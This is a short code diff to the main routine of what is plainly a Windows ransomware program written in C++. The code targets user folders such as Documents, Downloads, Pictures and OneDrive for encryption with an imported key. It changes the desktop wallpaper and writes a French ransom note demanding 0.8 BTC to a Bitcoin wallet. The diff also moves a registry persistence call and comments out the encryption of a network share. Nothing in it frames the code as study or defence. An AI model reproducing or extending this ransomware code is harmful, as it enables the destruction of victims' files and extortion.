@@ -3,8 +3,9 @@
 #include <Windows.h>
 #include "strsafe.h"
 #include <ShlObj.h>
-#include "persistence.h"
 #include "encrypt.h"
+#include "persistence.h"
+
 
 
 int main() {
@@ -14,12 +15,11 @@ int main() {
 		ExitProcess(1);
 
 	}
-	setRegkey();
+
 	HCRYPTKEY key = keyimport();
+
 	LPCWSTR targetDirs[] = { L"\\Documents",L"\\Downloads",L"\\Images",L"\\Videos",L"\\Pictures",L"\\OneDrive"};
 	LPWSTR userDir;
-	
-
 	for (LPCWSTR singledir : targetDirs) {
 		
 		SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &userDir);
@@ -28,7 +28,7 @@ int main() {
 		traverse(absoluteDirPath,key);
 	}
 
-	traverse(L"\\testShare:\\", key);
+	//traverse(L"\\testShare:\\", key);
 
 	LPCWSTR wallpapePath = L"C:\\Windows\\Temp\\kekchose.png";
 	bool res = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpapePath, SPIF_UPDATEINIFILE);
@@ -38,6 +38,7 @@ int main() {
 	myfile << "Vos fichiers encryptés !!! Payez la rançon 0.8 BTC sur wallet : 19BY2XCgbDe7WtTVbTyzM92R3LYr6VitWK" << std::endl;
 	myfile.close();
 
+	setRegkey();
 
 	return 0;
 }
